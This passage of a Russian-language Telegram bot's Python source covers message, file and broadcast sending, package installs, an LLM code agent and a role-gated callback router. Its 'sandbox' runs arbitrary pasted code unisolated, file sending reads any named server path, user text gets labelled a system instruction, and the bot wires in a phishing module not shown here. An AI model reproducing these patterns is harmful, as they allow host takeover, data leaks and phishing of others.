                f"Провайдер автоматически переключён.\n"
                f"Модель: <code>{config.LLM_MODEL}</code>",
                chat_id,
                reply_markup=kb([btn("🧪 Тест", "test"),
                                 btn("◀️ LLM меню", "menu_llm")]))

    # ── Отправка сообщений ─────────────────────────────────────────
    elif state.startswith('send_target:'):
        mode = state.split(':', 1)[1]
        _pending_agent_task[chat_id] = {'send_mode': mode, 'target': text.strip()}
        prompts2 = {
            'user':     "✏️ Введи текст сообщения:",
            'channel':  "✏️ Введи текст для канала:",
            'file':     "📎 Введи путь к файлу (или отправь файл):",
            'schedule': "✏️ Введи текст сообщения:",
        }
        _wait_state[chat_id] = f'send_text:{mode}'
        send_message(prompts2.get(mode, "✏️ Введи текст:"), chat_id,
                     reply_markup=kb([btn("❌ Отмена", "menu_send")]))

    elif state.startswith('send_text:'):
        mode   = state.split(':', 1)[1]
        task   = _pending_agent_task.pop(chat_id, {}) or {}
        target = task.get('target', '')

        if not target:
            send_message("❌ Получатель не задан. Начни заново.", chat_id,
                         reply_markup=kb([btn("📨 Отправить", "menu_send")]))
        elif mode == 'schedule':
            _pending_agent_task[chat_id] = {'send_mode': 'schedule',
                                            'target': target, 'text': text}
            _wait_state[chat_id] = 'send_delay'
            send_message("⏰ Через сколько секунд отправить? (например: 60):", chat_id,
                         reply_markup=kb([btn("❌ Отмена", "menu_send")]))
        elif mode in ('user', 'channel'):
            # Явно захватываем переменные в замыкание через аргументы
            def _do_send(_mode=mode, _target=target, _text=text, _cid=chat_id):
                _fn = send_to_user if _mode == 'user' else send_to_channel
                _ok, _err = _fn(_target, _text)
                _msg = ("✅ Отправлено → <code>{}</code>".format(_target) if _ok
                        else "❌ Ошибка: {}".format(_err))
                send_message(_msg, _cid,
                             reply_markup=kb([btn("📨 Ещё", "menu_send"), back_btn()]))
            _run_in_thread(_do_send)
        elif mode == 'file':
            def _do_file(_target=target, _text=text, _cid=chat_id):
                fpath = _text.strip().strip('\"\' ')
                if not os.path.isabs(fpath):
                    fpath = os.path.join(os.path.dirname(os.path.abspath(__file__)), fpath)
                _ok, _err = send_file_to(_target, fpath)
                _msg = ("✅ Файл отправлен → <code>{}</code>".format(_target) if _ok
                        else "❌ {}".format(_err))
                send_message(_msg, _cid,
                             reply_markup=kb([btn("📨 Ещё", "menu_send"), back_btn()]))
            _run_in_thread(_do_file)

    elif state == 'send_delay':
        task_data = _pending_agent_task.pop(chat_id, {}) or {}
        try:
            delay = int(text.strip())
            task_id = schedule_message(
                task_data.get('target', chat_id),
                task_data.get('text', ''),
                delay,
                on_sent=lambda ok, err: send_message(
                    f"✅ Запланированное сообщение {'отправлено' if ok else 'не отправлено: ' + str(err)}",
                    chat_id)
            )
            send_message(
                f"✅ Запланировано! Отправится через <b>{delay}с</b>\nID: <code>{task_id}</code>",
                chat_id, reply_markup=kb([btn("📋 Список", "send_scheduled"),
                                          back_btn("menu_send")]))
        except ValueError:
            send_message("❌ Введи число секунд", chat_id,
                         reply_markup=kb([btn("❌ Отмена", "menu_send")]))

    elif state.startswith('send_targets:'):
        mode = state.split(':', 1)[1]
        targets_raw = text.strip()
        targets = [t.strip() for t in targets_raw.replace('\n', ',').split(',') if t.strip()]
        _pending_agent_task[chat_id] = {'send_mode': 'broadcast', 'targets': targets}
        _wait_state[chat_id] = 'send_broadcast_text'
        send_message(f"📣 Получатели: <b>{len(targets)}</b>\n\n✏️ Введи текст рассылки:",
                     chat_id, reply_markup=kb([btn("❌ Отмена", "menu_send")]))

    elif state == 'send_broadcast_text':
        task_data = _pending_agent_task.pop(chat_id, {}) or {}
        targets   = task_data.get('targets', [])
        if not targets:
            send_message("❌ Нет получателей", chat_id)
        else:
            send_message(f"📣 Рассылка: <b>{len(targets)}</b> получателей...\n⏳ Начинаю...", chat_id)
            def _do_broadcast():
                def _prog(sent, total, err):
                    if sent % 5 == 0 or sent == total:
                        send_message(f"📣 {sent}/{total} отправлено", chat_id)
                result = broadcast(targets, text, on_progress=_prog)
                send_message(
                    f"✅ Рассылка завершена!\n"
                    f"Отправлено: <b>{result['sent']}</b>\n"
                    f"Ошибок: <b>{result['failed']}</b>",
                    chat_id, reply_markup=back_btn("menu_send"))
            _run_in_thread(_do_broadcast)

    elif state == 'update_install_pkg':
        pkg = text.strip()
        send_message(f"📦 Устанавливаю <code>{pkg}</code>...", chat_id)
        def _do_inst():
            ok, msg = install_package(pkg)
            status = "✅ Установлен" if ok else "❌ Ошибка"
            send_message(f"{status}: <code>{pkg}</code>\n<pre>{msg[:300]}</pre>",
                         chat_id, reply_markup=kb([back_btn("menu_update")]))
        _run_in_thread(_do_inst)

    elif state == 'agent_youtube_url':
        # Пользователь прислал URL — сохраняем и показываем выбор формата
        import re as _re
        url_text = text.strip()
        # Вытаскиваем URL из сообщения (пользователь мог написать что-то лишнее)
        m_url = _re.search(r'https?://[^\s]+', url_text)
        url = m_url.group(0) if m_url else url_text

        _yt_pending_url[chat_id] = url
        send_message(
            "🔗 <code>{}</code>\n\nВыбери формат:".format(url),
            chat_id,
            reply_markup=kb(
                [btn("🎬 MP4 — видео",   "yt_fmt:mp4"),
                 btn("🎵 MP3 — аудио",   "yt_fmt:mp3")],
                [btn("🎬 MP4 360p (лёгкий)", "yt_fmt:mp4_360"),
                 btn("🎬 MP4 1080p (тяжёлый)", "yt_fmt:mp4_1080")],
                [btn("❌ Отмена",         "menu_agent")],
            ))

    elif state.startswith('coder_input:'):
        # Универсальный обработчик ввода для агента-кодера
        proj_mode = state.split(':', 1)[1]  # write / review / fix / project / sandbox / bot_tools / file

        if proj_mode == 'sandbox':
            # Sandbox: запускаем код напрямую без LLM-генерации
            send_message("🏖 <b>Sandbox — запускаю...</b>", chat_id)
            def _do_sandbox():
                import tempfile, subprocess as _sp, re as _re
                code_match = _re.search(r'```(?:python)?\n(.*?)```', text, _re.DOTALL)
                code = code_match.group(1).strip() if code_match else text.strip()
                with tempfile.NamedTemporaryFile(suffix='.py', mode='w',
                                                 delete=False, encoding='utf-8') as tf:
                    tf.write(code); tmp_path = tf.name
                try:
                    r = _sp.run(
                        [sys.executable, tmp_path],
                        capture_output=True, timeout=30,
                        cwd=os.path.dirname(os.path.abspath(__file__))
                    )
                    def _dec(b):
                        if not b: return ''
                        for enc in ('utf-8','cp1251','cp866','latin-1'):
                            try: return b.decode(enc)
                            except: pass
                        return b.decode('utf-8', errors='replace')
                    out = _dec(r.stdout); err = _dec(r.stderr); rc = r.returncode
                    msg = "🏖 <b>Sandbox результат</b> (rc={}):\n".format(rc)
                    if out: msg += "\n<b>stdout:</b>\n<pre>{}</pre>".format(
                        out[:2000].replace('<','&lt;').replace('>','&gt;'))
                    if err: msg += "\n<b>stderr:</b>\n<pre>{}</pre>".format(
                        err[:1000].replace('<','&lt;').replace('>','&gt;'))
                    if not out and not err: msg += "\n<i>(нет вывода)</i>"
                except _sp.TimeoutExpired:
                    msg = "⏰ Sandbox: таймаут 30 сек"
                except Exception as e:
                    msg = "❌ Sandbox ошибка: {}".format(e)
                finally:
                    try: os.unlink(tmp_path)
                    except Exception: pass
                send_message(msg, chat_id, reply_markup=kb([
                    btn("🏖 Ещё код в sandbox", "coder:sandbox"),
                    btn("💬 Продолжить задачу",  "agent_status"),
                    btn("◀️ Меню агента",        "menu_agent"),
                ]))
            _run_in_thread(_do_sandbox)

        elif proj_mode == 'bot_tools':
            # Агент с доступом к инструментам бота
            send_message("🤖 <b>Агент с инструментами бота...</b>", chat_id)
            def _do_bot_tools():
                from chat_agent import code_agent_run
                from bot_tools import execute_bot_tool, get_tools_help
                def _send(txt, cid): send_message(txt, cid)
                def _sdoc(path, caption, chat_id): send_document(path, caption=caption, chat_id=chat_id)

                # Запускаем агента, перехватываем BOT_TOOL команды из вывода
                result = code_agent_run(chat_id, text,
                                        on_status=lambda m: send_message(m, chat_id),
                                        proj_mode=None)
                full_out = result.get('_full_output', '')

                # Ищем и выполняем BOT_TOOL команды в выводе
                import re as _re
                for m in _re.finditer(r'BOT_TOOL:\s*(.+)', full_out):
                    cmd_line = m.group(1).strip()
                    send_message("🔧 Выполняю: <code>{}</code>".format(cmd_line), chat_id)
                    tool_result = execute_bot_tool(cmd_line, chat_id, _send, _sdoc)
                    send_message("↩️ {}".format(tool_result), chat_id)

                if full_out and 'BOT_TOOL:' not in full_out:
                    send_message(full_out[:3000], chat_id)
                send_message("✅ <b>Готово.</b> Сессия активна — пиши следующую задачу.", chat_id, reply_markup=chat_control_keyboard())
            _run_in_thread(_do_bot_tools)

        else:
            # Стандартные режимы: write, review, fix, project, file
            pm_map = {
                'write':   None,
                'review':  'review',
                'fix':     'fix',
                'project': 'plan',
                'file':    None,
            }
            pm = pm_map.get(proj_mode, None)
            _run_code_task(chat_id, text, proj_mode=pm)

    elif state == 'chat_websearch':
        # Веб-поиск прямо из чата
        send_message("🌐 Ищу: <i>{}</i>...".format(text[:100]), chat_id)
        def _do_search():
            from llm_client import call_llm
            prompt = (
                "Пользователь просит найти информацию в интернете: {}\n\n"
                "У тебя нет прямого доступа к интернету, но ответь на основе своих знаний "
                "максимально подробно. Если информация может быть устаревшей — скажи об этом."
            ).format(text)
            reply = call_llm(prompt)
            send_message(reply[:3500], chat_id, reply_markup=chat_control_keyboard(mode='chat'))
        _run_in_thread(_do_search)

    elif state == 'chat_persona':
        # Смена роли/личности ИИ
        from chat_agent import add_to_history
        add_to_history(chat_id, 'system' if False else 'user',
                       "[СИСТЕМНАЯ ИНСТРУКЦИЯ] " + text)
        send_message(
            "🎭 Роль установлена:\n<i>{}</i>\n\n"
            "Теперь я буду отвечать в этой роли.".format(text[:200]),
            chat_id, reply_markup=chat_control_keyboard(mode='chat'))

    elif state == 'tools_save_html':
        from bot_tools import execute_bot_tool
        def _send(txt, cid): send_message(txt, cid)
        def _sdoc(path, cap, chat_id): send_document(path, caption=cap, chat_id=chat_id)
        def _do():
            result = execute_bot_tool('save_html ' + text.strip(), chat_id, _send, _sdoc)
            send_message(result, chat_id, reply_markup=kb([btn("◀️ Инструменты", "agent_tools_menu")]))
        _run_in_thread(_do)

    elif state == 'fix_input':
        send_message("🔧 Запускаю агент исправления...", chat_id)
        def _do_fix():
            from chat_agent import code_agent_run
            result = code_agent_run(chat_id, text, on_status=lambda m: send_message(m, chat_id))
            out = result.get('_full_output') or result.get('output','')
            if out:
                _send_chunked(chat_id, out[:4000])
            if result.get('code'):
                import html as _h
                send_message(
                    "<b>Исправленный код:</b>\n<pre>{}</pre>".format(_h.escape(result['code'][:3000])),
                    chat_id, reply_markup=chat_control_keyboard())
        _run_in_thread(_do_fix)

    elif state == 'analyze_input':
        send_message("🔍 Анализирую...", chat_id)
        def _do_analyze():
            try:
                from agent_core import analyze_code, extract_code as _ec, SYS_ANALYZER
                from llm_client import call_llm
                code = _ec(text)
                result = analyze_code(code, text) if code else call_llm(text, SYS_ANALYZER, max_tokens=2000)
            except Exception as e:
                result = "❌ Ошибка: {}".format(e)
            _send_chunked(chat_id, result[:4000])
        _run_in_thread(_do_analyze)

    elif state == 'file_custom_input':
        pending = _pending_file.pop(chat_id, None)
        if not pending:
            send_message("❌ Файл не найден. Загрузи снова.", chat_id,
                         reply_markup=chat_control_keyboard())
            return
        send_message("⚙️ Выполняю: <i>{}</i>".format(text[:100]), chat_id)
        try:
            with open(pending['path'], 'r', encoding='utf-8', errors='ignore') as f:
                file_content = f.read()
        except Exception:
            file_content = pending['analysis']
        full_task = "{}\n\nФайл: {}\n\n```\n{}\n```".format(
            text, pending['filename'], file_content[:8000])
        _run_in_thread(_run_code_task, chat_id, full_task)

    else:
        # Передаём в фишинг-модуль если это fish_ состояние
        if FISH_ENABLED and state.startswith('fish_'):
            _fish_handle_wait_state(state, text, chat_id)
        elif state == 'code_session':
            # Persistent: агент-кодер принимает задачи пока не нажать стоп
            _handle_agent_message(chat_id, text, 'code')
        elif state.startswith('adm_sc_input:'):
            # Persistent: СМИТ
            _handle_agent_message(chat_id, text, 'smith')
        else:
            send_message("❓ Неизвестное состояние. Нажми /menu", chat_id)


def _apply_custom_prompt(text, chat_id):
    STYLES['custom']['system'] = text
    _update_env('REWRITE_STYLE', 'custom')
    config.reload()
    preview = text[:200] + ('...' if len(text) > 200 else '')
    send_message(
        "✅ Свой промт сохранён и активирован!\n\n<i>{}</i>".format(preview),
        chat_id, reply_markup=kb([btn("◀️ Главное меню", "menu")])
    )

def _apply_llm(provider, model, api_key, chat_id):
    _update_env('LLM_PROVIDER', provider.lower())
    _update_env('LLM_MODEL', model)
    if api_key:
        _update_env('LLM_API_KEY', api_key)
        # Также сохраняем как провайдер-специфичный ключ
        try:
            from llm_client import _PROVIDER_KEY_MAP
            attr = _PROVIDER_KEY_MAP.get(provider.lower(), '')
            if attr and attr != 'LLM_API_KEY':
                _update_env(attr, api_key)
        except Exception:
            pass
    config.reload()
    send_message(
        "✅ LLM обновлён:\nПровайдер: <b>{}</b>\nМодель: <b>{}</b>".format(
            config.LLM_PROVIDER, config.LLM_MODEL),
        chat_id,
        reply_markup=kb([btn("🧪 Тест", "test"), btn("◀️ LLM меню", "menu_llm")])
    )

def _apply_voice(val, chat_id):
    provider = (config.TTS_PROVIDER or 'edge').lower().strip()
    if provider in ('eleven', 'elevenlabs', '11labs'):
        _update_env('ELEVEN_VOICE_ID', val)
        config.reload()
        send_message("✅ ElevenLabs voice_id: <b>{}</b>".format(val), chat_id,
                     reply_markup=kb([btn("◀️ Назад", "menu_tts")]))
    else:
        _update_env('TTS_VOICE', val)
        config.reload()
        send_message("✅ Голос: <b>{}</b>".format(val), chat_id,
                     reply_markup=kb([btn("◀️ Назад", "menu_tts")]))

def _show_env(chat_id):
    lines = ["📁 <code>{}</code>\n".format(config.ENV_PATH)]
    try:
        with open(config.ENV_PATH) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                key, _, val = line.partition('=')
                if any(s in key for s in ('KEY', 'TOKEN', 'SECRET')):
                    val = val[:4] + '***' if val else '(пусто)'
                lines.append("<code>{}={}</code>".format(key, val))
    except FileNotFoundError:
        lines.append('❌ .env не найден!')
    send_message("\n".join(lines), chat_id,
                 reply_markup=kb([btn("◀️ Главное меню", "menu")]))


# ══════════════════════════════════════════════════════════════
#  ОБРАБОТЧИК CALLBACK QUERY (inline-кнопки)
# ══════════════════════════════════════════════════════════════

# ══════════════════════════════════════════════════════════════
#  ПРОФИЛЬ ПОЛЬЗОВАТЕЛЯ
# ══════════════════════════════════════════════════════════════

def _show_profile(chat_id):
    """Показывает личный профиль пользователя."""
    text = format_profile(int(chat_id))
    rows = kb(
        [btn("🔄 Обновить",         "profile"),
         btn("🏆 Таблица рейтинга", "profile_leaderboard")],
        [btn("◀️ Главное меню",     "menu")],
    )
    send_message(text, chat_id, reply_markup=rows)


def _show_leaderboard(chat_id):
    """Топ-10 пользователей по рейтингу."""
    users = get_all_users()
    active = [u for u in users if u.get('status') == 'active'][:10]

    if not active:
        send_message("📭 Пока нет активных пользователей.", chat_id,
                     reply_markup=kb([btn("◀️ Профиль", "profile")]))
        return

    lines = ["🏆 <b>Таблица рейтинга</b>\n"]
    medals = ['🥇','🥈','🥉']
    for i, u in enumerate(active):
        icon   = medals[i] if i < 3 else f"{i+1}."
        login  = u.get('login') or '—'
        rating = u.get('rating') or 0
        priv   = u.get('privilege') or 'user'
        priv_icon = PRIVILEGE_ICONS.get(priv,'👤')
        lines.append(f"{icon}  <b>{login}</b>  {priv_icon}  — {rating} очков")

    send_message("\n".join(lines), chat_id,
                 reply_markup=kb([btn("👤 Мой профиль","profile"),
                                  btn("◀️ Меню","menu")]))


def handle_callback(cq):
    """Центральный роутер для всех нажатий inline-кнопок."""
    cb_id   = cq['id']
    data    = cq.get('data', '')
    chat_id = str(cq['message']['chat']['id'])
    msg_id  = cq['message']['message_id']

    # ══ ГЕЙТ АВТОРИЗАЦИИ ══════════════════════════════════════════════════
    if not is_authenticated(chat_id):
        action_check = data.split(':')[0]
        PIN_ACTIONS = ('captcha_new', 'captcha_hint',
                       'pin_digit', 'pin_ok', 'pin_del', 'pin_forgot')
        if action_check in PIN_ACTIONS:
            from auth_module import auth_handle_callback as _ahcb
            _ahcb(chat_id, data)
            answer_callback(cb_id)
            # Если после обработки юзер авторизован — показываем меню
            if is_authenticated(chat_id):
                send_message(_current_status_text(chat_id), chat_id, reply_markup=menu_keyboard(chat_id))
            return
        answer_callback(cb_id, "🔒 Требуется авторизация", alert=True)
        try:
            step, _ = auth_state_get(chat_id)
        except Exception:
            step = 'idle'
        if step == 'idle':
            auth_start(chat_id)
        return
    # ══ КОНЕЦ ГЕЙТА ════════════════════════════════════════════════════════

    # Разбираем формат "action" или "action:arg"
    action, _, arg = data.partition(':')

    try:
        _route_callback(action, arg, cb_id, chat_id, msg_id)
    except Exception as e:
        # Любая ошибка — сразу показываем пользователю, не глотаем молча
        print("❌ Callback error [{}]: {}".format(data, e), flush=True)
        answer_callback(cb_id, "❌ Ошибка: {}".format(str(e)[:100]), alert=True)
        send_message("❌ Ошибка при обработке кнопки:\n<code>{}</code>".format(e), chat_id)


def _route_smith(arg, cb_id, chat_id, msg_id):
    """Обработчик всех АГЕНТ_СМИТ колбэков."""

    if arg == 'smith_menu':
        edit_message(chat_id, msg_id,
            "🕵️ <b>АГЕНТ_СМИТ</b> — выбери режим:",
            reply_markup=kb(
                [btn("💻 Агент-Кодер (все функции)", "adm:smith_coder")],
                [btn("══ 🖊 КОД ══",              "adm_noop")],
                [btn("🤖 Авто-задача",            "adm:smith:auto"),
                 btn("🧩 Scaffold проект",        "adm:smith:scaffold")],
                [btn("🔧 Patch / Багфикс",        "adm:smith:patch"),
                 btn("📋 Plan-first",             "adm:smith:plan_first")],
                [btn("══ 🤖 TELEGRAM ══",         "adm_noop")],
                [btn("🤖 Telegram бот",           "adm:smith:tg_bot"),
                 btn("🔌 Aiogram бот",            "adm:smith:aiogram_bot")],
                [btn("🎮 Inline-бот",             "adm:smith:inline_bot"),
                 btn("🔔 Уведомления",            "adm:smith:notif_bot")],
                [btn("══ 🌐 ВЕБ ══",              "adm_noop")],
                [btn("⚡ FastAPI сервис",          "adm:smith:fastapi"),
                 btn("🕸 Flask сервер",            "adm:smith:flask")],
                [btn("🕷 Scraper/Парсер",          "adm:smith:scraper"),
                 btn("📡 API клиент",             "adm:smith:api_client")],
                [btn("══ 🖥 АВТОМАТИЗАЦИЯ ══",    "adm_noop")],
                [btn("⌨️ pynput скрипт",          "adm:smith:pynput"),
                 btn("🖱 pyautogui скрипт",       "adm:smith:pyautogui")],
                [btn("⏰ Планировщик",             "adm:smith:scheduler"),
                 btn("🖥 Desktop утилита",        "adm:smith:desktop")],
                [btn("══ 📊 ДАННЫЕ ══",           "adm_noop")],
                [btn("📊 pandas / Excel",         "adm:smith:pandas"),
                 btn("🗄 SQLite / DB",            "adm:smith:sqlite")],
                [btn("📈 Графики matplotlib",     "adm:smith:plots"),
                 btn("🔄 ETL pipeline",           "adm:smith:etl")],
                [btn("══ 🔐 БЕЗОПАСНОСТЬ ══",     "adm_noop")],
                [btn("🔐 Шифрование",             "adm:smith:crypto"),
                 btn("🔑 JWT / Auth",             "adm:smith:jwt")],
                [btn("══ 🎨 МЕДИА ══",            "adm_noop")],
                [btn("🎬 Видео из фото",          "adm:smith:slideshow"),
                 btn("🎙 TTS озвучка",            "adm:smith:tts_task")],
                [btn("🖼 Обработка картинок",     "adm:smith:image_proc"),
                 btn("🎵 Аудио обработка",        "adm:smith:audio_proc")],
                [btn("══ 📦 УТИЛИТЫ ══",          "adm_noop")],
                [btn("🗜 ZIP / архив",             "adm:smith:archiver"),
                 btn("📧 Email скрипт",           "adm:smith:email")],
                [btn("🐳 Docker helper",          "adm:smith:docker"),
                 btn("📝 Markdown / PDF",         "adm:smith:report")],
                [btn("◀️ Адм. меню",              "admin")],
            ))

    elif arg == 'smith_coder':
        edit_message(chat_id, msg_id,
            "🕵️💻 <b>АГЕНТ_СМИТ — Кодер</b>\n\n"
            "🖊 <b>Написать код</b> — опиши задачу, Смит напишет, протестирует и отдаст zip\n"
            "🔍 <b>Ревью кода</b> — найдёт баги, уязвимости, code-smell\n"
            "🔧 <b>Исправить ошибку</b> — вставь код + traceback → авто-фикс x15\n"
            "📦 <b>Создать проект</b> — полная структура с файлами, тестами, README\n"
            "🏖 <b>Sandbox</b> — выполни любой Python-код прямо сейчас\n"
            "🧩 <b>Scaffold</b> — полный шаблон проекта\n"
            "🔄 <b>Рефакторинг</b> — улучшит код, добавит типы\n"
            "🧪 <b>Тесты</b> — напишет pytest тесты\n"
            "📊 <b>Анализ кода</b> — сложность, зависимости\n"
            "🐳 <b>Dockerize</b> — Dockerfile + compose\n\n"
            f"Модель: <b>{config.LLM_PROVIDER} / {config.LLM_MODEL}</b>",
            reply_markup=kb(
                [btn("🖊 Написать код",        "adm:sc:write"),
                 btn("🔍 Ревью кода",          "adm:sc:review")],
                [btn("🔧 Исправить ошибку",    "adm:sc:fix"),
                 btn("📦 Создать проект",      "adm:sc:project")],
                [btn("🏖 Sandbox",             "adm:sc:sandbox"),
                 btn("🤖 Инструменты бота",    "adm:sc:bot_tools")],
                [btn("📁 Создать файл",        "adm:sc:file"),
                 btn("🧩 Scaffold",            "adm:sc:scaffold")],
                [btn("🔄 Рефакторинг",         "adm:sc:refactor"),
                 btn("🧪 Написать тесты",      "adm:sc:tests")],
                [btn("📊 Анализ кода",         "adm:sc:analyze"),
                 btn("🐳 Dockerize",           "adm:sc:dockerize")],
                [btn("◀️ АГЕНТ_СМИТ",          "adm:smith_menu")],
            ))

    elif arg == 'close_agent':
        try:
            from agent_session import close_session
            close_session(chat_id)
        except ImportError:
            pass
        _wait_state.pop(chat_id, None)
        edit_message(chat_id, msg_id, "🤖 Сессия агента закрыта.",
                     reply_markup=kb([btn("◀️ Адм. меню","admin")]))

    elif arg.startswith('smith:'):
        smith_mode = arg.split(':', 1)[1]
        SMITH_TASKS = {
            'auto':         "Опиши задачу для АГЕНТ_СМИТ:",
            'scaffold':     "Опиши что создать (название, функции):",
            'patch':        "Вставь код + описание бага:",
            'plan_first':   "Опиши задачу — сначала покажу план:",
            'tg_bot':       "Телеграм бот на python-telegram-bot v20 с командами /start /help и inline-кнопками",
            'aiogram_bot':  "Telegram бот на aiogram 3.x с FSM и inline-клавиатурами",
            'inline_bot':   "Telegram inline-бот с обработкой inline-запросов",
            'notif_bot':    "Telegram бот с уведомлениями по расписанию через schedule",
            'fastapi':      "FastAPI REST API с CRUD эндпоинтами и pydantic моделями",
            'flask':        "Flask веб-приложение с роутами и REST API",
            'scraper':      "Веб-парсер на requests+BeautifulSoup с сохранением в JSON и CSV",
            'api_client':   "Python REST API клиент с retry, timeout, auth и логированием",
            'pynput':       "Python автоматизация клавиатуры и мыши через pynput: горячие клавиши, макросы",
            'pyautogui':    "GUI автоматизация через pyautogui: поиск, клики, скриншоты",
            'scheduler':    "Планировщик задач через APScheduler с cron-выражениями",
            'desktop':      "Десктопный скрипт для автоматизации системных задач через psutil",
            'pandas':       "Обработка данных: pandas read_csv/excel, фильтры, группировка, экспорт",
            'sqlite':       "Работа с SQLite: создание таблиц, CRUD, sqlalchemy ORM",
            'plots':        "Визуализация данных: matplotlib/seaborn графики, сохранение в PNG",
            'etl':          "ETL pipeline: чтение, трансформация, загрузка в целевой формат",
            'crypto':       "Шифрование файлов через cryptography (Fernet) и hashlib",
            'jwt':          "JWT авторизация: генерация токенов, верификация, refresh",
            'slideshow':    "Собери видео-слайдшоу из изображений. Пришли фото после описания.",
            'tts_task':     "Введи текст для озвучки через edge-tts:",
            'image_proc':   "Обработка изображений через Pillow: resize, crop, filter, watermark",
            'audio_proc':   "Обработка аудио через pydub: конвертация, обрезка, нормализация",
            'archiver':     "Утилита для ZIP/TAR архивов с прогресс-баром",
            'email':        "Отправка email через smtplib с HTML-шаблоном и вложениями",
            'docker':       "Dockerfile + docker-compose.yml для Python приложения",
            'report':       "Генератор отчётов в Markdown и PDF через jinja2",
        }
        task_text = SMITH_TASKS.get(smith_mode, "Опиши задачу:")
        needs_input = smith_mode in ('auto', 'scaffold', 'patch', 'plan_first',
                                      'tts_task', 'slideshow')

        try:
            from agent_session import create_session, STAGE_WAIT_FILES
            sess = create_session(chat_id)
            sess.stage = STAGE_WAIT_FILES
        except Exception:
            pass

        if needs_input:
            _wait_state[chat_id] = 'adm_agent_task'
            edit_message(chat_id, msg_id,
                f"🕵️ <b>АГЕНТ_СМИТ</b> [{smith_mode}]\n\n{task_text}",
                reply_markup=kb([btn("❌ Отмена","adm:close_agent")]))
        else:
            edit_message(chat_id, msg_id,
                f"🕵️ Запускаю: <i>{task_text[:100]}</i>\n\n⏳...",
                reply_markup=kb([btn("❌ Отмена","adm:close_agent")]))
            def _run(_t=task_text, _s=arg):
                try:
                    from agent_session import get_session, create_session, execute_pipeline, close_session, STAGE_WAIT_FILES
                    s = get_session(chat_id) or create_session(chat_id)
                    s.task = _t; s.stage = STAGE_WAIT_FILES; s.touch()
                    from agent_core import _llm_call as llm_fn
                except Exception: llm_fn = None
                try:
                    from agent_session import get_session, create_session, execute_pipeline, close_session, STAGE_WAIT_FILES
                    s2 = get_session(chat_id) or create_session(chat_id)
                    s2.task = _t; s2.stage = STAGE_WAIT_FILES
                    result = execute_pipeline(s2, on_status=lambda m: send_message(m, chat_id), llm_caller=llm_fn)
                    for art in result.get('artifacts', []):
                        if os.path.exists(art.get('path','')):
                            try: send_document(art['path'], caption=f"📎 {art['name']}", chat_id=chat_id)
                            except Exception: pass
                    if result.get('zip_path') and os.path.exists(result['zip_path']):
                        try: send_document(result['zip_path'], caption="📦 Результат", chat_id=chat_id)
                        except Exception: pass
                    errs = result.get('errors', [])
                    send_message(
                        f"{'✅' if result.get('ok') else '⚠️'} СМИТ завершил\n"
                        f"Артефактов: {len(result.get('artifacts',[]))}"
                        + (f"\nОшибок: {len(errs)}" if errs else ""),
                        chat_id,
                        reply_markup=kb([btn("🕵️ Ещё","adm:smith_menu")],[btn("◀️ Адм","admin")])
                    )
                    close_session(chat_id)
                except Exception as e:
                    send_message(f"❌ {e}", chat_id)
            _run_in_thread(_run)

    elif arg.startswith('sc:'):
        sc_mode = arg.split(':', 1)[1]
        SC_PROMPTS = {
            'write':    "🖊 Опиши задачу — Смит напишет и протестирует код:",
            'review':   "🔍 Вставь код для ревью:",
            'fix':      "🔧 Вставь код + traceback ошибки:",
            'project':  "📦 Опиши проект (название, функции, структура):",
            'sandbox':  "🏖 Вставь Python-код для запуска в sandbox:",
            'bot_tools':"🤖 Опиши задачу для агента с инструментами:",
            'file':     "📁 Что создать? (тип, содержимое, название):",
            'scaffold': "🧩 Опиши шаблон проекта (тип: flask/fastapi/bot/cli):",
            'refactor': "🔄 Вставь код для рефакторинга:",
            'tests':    "🧪 Вставь код для которого нужны тесты:",
            'analyze':  "📊 Вставь код для анализа:",
            'dockerize':"🐳 Опиши проект для dockerize:",
        }
        prompt_msg = SC_PROMPTS.get(sc_mode, "Опиши задачу:")
        try:
            from agent_session import create_session, STAGE_WAIT_FILES
            sess = create_session(chat_id)
            sess.stage = STAGE_WAIT_FILES
        except Exception:
            pass
        _wait_state[chat_id] = f'adm_sc_input:{sc_mode}'
        edit_message(chat_id, msg_id,
            f"🕵️💻 <b>СМИТ — {sc_mode.upper()}</b>\n\n{prompt_msg}",
            reply_markup=kb([btn("❌ Отмена","adm:smith_coder")]))


def _route_callback(action, arg, cb_id, chat_id, msg_id):
    """Вся логика роутинга callback-ов."""
    from llm_checker import RECOMMENDED

    # ── Ролевой контроль ─────────────────────────────────────────
    try:
        from roles import has_perm as _hp, perm_denied_msg
        from admin_module import get_role as _gr
        _role = _gr(chat_id)
        def _need(perm: str) -> bool:
            """Проверяет разрешение. Если нет — отправляет сообщение и возвращает False."""
            if _hp(_role, perm):
                return True
            answer_callback(cb_id, "🚫 Нет доступа", alert=True)
            send_message(perm_denied_msg(perm, _role), chat_id,
                         reply_markup=menu_keyboard(chat_id))
            return False
    except Exception:
        _role = 'user'
        def _need(perm): return True

    # Действия требующие конкретных прав
    _PERM_MAP = {
        'agent_chat_start':  'chat',
        'agent_code_start':  'code_agent',
        'menu_image':        'image_gen',
        'menu_tts':          'tts',
        'menu_llm':          'llm_change',
        'menu_fish':         'fish_module',
        'menu_update':       'manage_bots',
        'selfcheck':         'view_logs',
        'run':               'manage_bots',
        'parse':             'manage_bots',
        'env':               'view_env',
        'admin':             'admin_panel',
        'test':              'llm_change',
        'tasks':             'tools_basic',
    }
    if action in _PERM_MAP:
        if not _need(_PERM_MAP[action]):
            return

    # BAN — только штраф и профиль
    if _role == 'ban' and action not in ('pay_fine', 'profile', 'billing', 'menu', 'pin_digit',
                                          'pin_ok', 'pin_del', 'captcha_new'):
        answer_callback(cb_id, "🚫 Аккаунт заблокирован", alert=True)
        return

    # NOOB — только профиль, биллинг, справка
    if _role == 'noob' and action not in ('profile', 'billing', 'help', 'menu', 'pay_fine',
                                           'pin_digit', 'pin_ok', 'pin_del', 'captcha_new'):
        answer_callback(cb_id, "🔰 Нужно повысить роль", alert=True)
        send_message(
            "🔰 <b>Доступ ограничен</b>\n\n"
            "Твоя роль: <b>NOOB</b>\n"
            "Доступно только: профиль и биллинг.\n\n"
            "<i>Обратись к администратору для повышения роли</i>",
            chat_id, reply_markup=menu_keyboard(chat_id))
        return

    # ── Навигация ─────────────────────────────────────────────
    if action == 'menu':
        edit_message(chat_id, msg_id, _current_status_text(chat_id), reply_markup=menu_keyboard(chat_id))
        answer_callback(cb_id)

    elif action == 'menu_style':
        sk = _get_env_style()
        si = STYLES.get(sk, {})
        text = (
            "🎭 <b>Стиль переписывания</b>\n\n"
            "Текущий: {} <b>{}</b>\n"
            "<i>{}</i>"
